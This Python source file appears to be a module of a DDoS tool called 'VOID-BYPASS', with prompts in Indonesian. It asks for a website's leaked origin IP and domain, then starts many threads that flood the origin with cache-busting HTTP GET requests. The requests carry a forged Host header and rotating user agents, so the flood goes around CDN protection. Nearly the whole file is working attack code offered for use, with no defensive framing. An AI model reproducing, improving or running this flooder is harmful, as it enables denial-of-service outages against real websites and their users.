import socket
import threading
import time
import random
import sys
import os
import math

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
]

def rgb_text(text, offset=0):
    FREQ = 0.08
    out = []
    for i, c in enumerate(text):
        if c == "\n":
            out.append("\n")
            continue
        r = int(math.sin(FREQ * i + offset) * 127 + 128)
        g = int(math.sin(FREQ * i + offset + 2) * 127 + 128)
        b = int(math.sin(FREQ * i + offset + 4) * 127 + 128)
        out.append(f"\033[38;2;{r};{g};{b}m{c}")
    return "".join(out) + "\033[0m"

def get_logo():
    return r"""
 ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
 ░▒▓██▓▒░        ▄████████████▄        ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▀▄ ▓▓ ▄▀ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▓▓ ▼▼ ▓▓ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░        ▀████████████▀        ░▒▓██▓▒░
  ░▒▓██▓▒░         ▀▀██████▀▀         ░▒▓██▓▒░
 
        ╔══════════════════════════════════╗
        ║     V O I D - B Y P A S S        ║
        ╚══════════════════════════════════╝
           [ DIRECT IP + HOST HEADER SPOOF ]
    """

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def flush_input():
    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except:
        pass

stop_flag = False
packet_count = 0

def attack_worker(target_ip, target_host, port):
    global packet_count
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, port))
            
            payload = (
                f"GET /?{random.randint(1000,9999)} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"   # <--- SPOOF HOST HEADER
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"\r\n"
            ).encode()
            
            for _ in range(50):
                if stop_flag: break
                s.send(payload)
                packet_count += 1
            
            s.close()
        except:
            pass

def run_bypass(key):
    global stop_flag, packet_count
    
    if key != "VOID_ACCESS_GRANTED_2026": return

    while True:
        clear()
        print(rgb_text(get_logo(), 5))
        print("\n\033[1;36m [ DIRECT ORIGIN STRESSER ]\033[0m")
        print(" Gunakan IP dari hasil 'Potential Leaks'.")
        print(" Script ini akan menyuntikkan Host Header agar server merespons.")
        print(" 0. Kembali")
        
        try:
            target_ip = ""
            while not target_ip:
                flush_input() # Bersihkan sisa enter sebelumnya
                raw_ip = input("\n \033[1;33m[?] Masukkan IP ASLI (Potential): \033[0m").strip()
                if raw_ip == "0": return # Opsi keluar
                if raw_ip:
                    target_ip = raw_ip
                else:
                    print(" \033[1;31m[!] IP tidak boleh kosong.\033[0m")

            target_host = ""
            while not target_host:
                flush_input()
                raw_host = input(" \033[1;33m[?] Masukkan DOMAIN ASLI (cth: site.com): \033[0m").strip()
                if raw_host == "0": return
                if raw_host:
                    target_host = raw_host
                else:
                     print(" \033[1;31m[!] Domain tidak boleh kosong.\033[0m")
            
            flush_input()
            port_in = input(" \033[1;33m[?] Port (80/443) [Default 80]: \033[0m").strip()
            port = int(port_in) if port_in else 80

            flush_input()
            threads_in = input(" \033[1;33m[?] Threads [Default 100]: \033[0m").strip()
            threads = int(threads_in) if threads_in else 100
            
        except KeyboardInterrupt:
            return # Keluar jika CTRL+C
        except ValueError:
            print(" \033[1;31m[!] Input Angka Salah!\033[0m")
            time.sleep(1)
            continue 

        print(f"\n\033[1;32m [+] TARGET LOCKED: {target_ip} (Masking as {target_host})\033[0m")
        print("\033[1;31m [+] FIRE! Press CTRL+C to Stop.\033[0m")
        time.sleep(1)
        
        stop_flag = False
        packet_count = 0
        thread_list = []
        
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, args=(target_ip, target_host, port))
            t.daemon = True
            t.start()
            thread_list.append(t)
            
        try:
            while True:
                sys.stdout.write(f"\r\033[K \033[1;36m[⚔️] HITS: {packet_count} | Target: {target_ip} >> {target_host}\033[0m")
                sys.stdout.flush()
                time.sleep(0.1)
        except KeyboardInterrupt:
            stop_flag = True
            print("\n\n\033[1;33m [!] ATTACK STOPPED.\033[0m")
            time.sleep(1)
            
        flush_input()
        input("\n Tekan Enter untuk kembali...")

if __name__ == "__main__":
    print("[!] Run from login.py")
